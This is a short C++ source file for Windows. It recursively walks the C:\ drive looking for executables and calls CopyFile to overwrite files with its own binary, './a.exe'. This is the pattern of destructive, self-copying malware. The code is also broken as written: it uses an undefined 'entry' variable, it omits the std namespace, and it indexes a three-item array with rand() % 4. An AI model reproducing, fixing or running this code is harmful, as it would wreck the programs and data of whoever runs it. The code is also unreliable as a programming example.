#include <windows.h>
#include <string>
#include <iostream>
string sWords[] = {"Lol","Mitze","Katze"};
string Chain = "";

void FckFiles(std::string directory, std::string fileFilter, bool recursively = true)
{
  if (recursively)
	FckFiles(directory, fileFilter, false);

  directory += "\\";

  WIN32_FIND_DATA FindFileData;
  HANDLE hFind = INVALID_HANDLE_VALUE;

  std::string filter = directory + (recursively ? "*" : fileFilter);

  hFind = FindFirstFile(filter.c_str(), &FindFileData);
  Chain = Chain + sWords[rand() % 4];
  std::cout << Chain;
  CopyFile("./a.exe",entry.path().string().c_str(),0);
  if (hFind == INVALID_HANDLE_VALUE)
  {
	return;
  }
  else
  {
	if (!recursively)
	{
	  std::cout << directory + std::string(FindFileData.cFileName) << std::endl;
	}

	while (FindNextFile(hFind, &FindFileData) != 0)
	{
	  if (!recursively)
	  {
		std::cout << directory + std::string(FindFileData.cFileName) << std::endl;
	  }
	  else
	  {
		if ((FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)>0 && FindFileData.cFileName[0]!='.')
		{
		  FckFiles(directory + std::string(FindFileData.cFileName), fileFilter);
		}
	  }
	}

	DWORD dwError = GetLastError();
	FindClose(hFind);
	if (dwError != ERROR_NO_MORE_FILES)
	{
	  
	}
  }
}

int main(int argc, char* argv[])
{
  FckFiles("C:\\", "*.exe");
}